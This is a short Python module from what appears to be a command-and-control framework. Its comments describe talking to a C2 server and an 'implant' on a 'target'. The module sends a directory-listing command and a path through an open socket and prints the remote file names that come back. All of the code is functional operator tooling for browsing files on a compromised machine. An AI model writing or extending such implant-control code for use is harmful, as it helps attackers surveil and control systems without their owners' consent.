# Patrick Sacchet
# Version 1.0
# Serves to implement interfacing with dir list functionality 

SUCCESS = 1
FAILURE = 0

# Command value
DIR = 3


'''
Description:
    Prints dir listing usage for user
Params:
    N/A
Returns:
    SUCCESS or FAILURE  
'''
def printDirListHelp():
    print("""Required params: \n
                -path - path to directory we're listing off target \n""")
    return SUCCESS


'''
Description:
    Performs dir list functionality; communicates with C2 server and handles responses
Params:
    sock - sock object with connection already established
    dirPath - path on target to dir list
Returns:
    SUCCESS or FAILURE 
'''
def dirList(sock, dirPath):
    try:
        # First tell our implant we want a DIR list performed
        print("Sending command...")
        sock.send(bytes(str(DIR), "utf-8") + b'\x00')

        # Send filepath to write to 
        print("Sending dir path...")
        sock.send(dirPath + b'\x00')

        print("Files in %s:" % dirPath.decode('utf-8'))

        data = sock.recv(1024)
        data = data.strip()
        data = data.decode('utf-8')

        # Keep getting files back until we get our terminator
        while (data != "SUCCESS"):
            if (data != "" and data != " "):
                print("\t%s" % data)
            if (data == "FAILURE"):
                print("Dir list returned failure!")
                return FAILURE
            data = sock.recv(1024)
            data = data.strip()
            data = data.decode('utf-8')

        print("\nSuccessful dir list!\n")


    except Exception as e:
        print("ERROR: Could not send dir list to implant: ", e)
        return FAILURE

    return SUCCESS
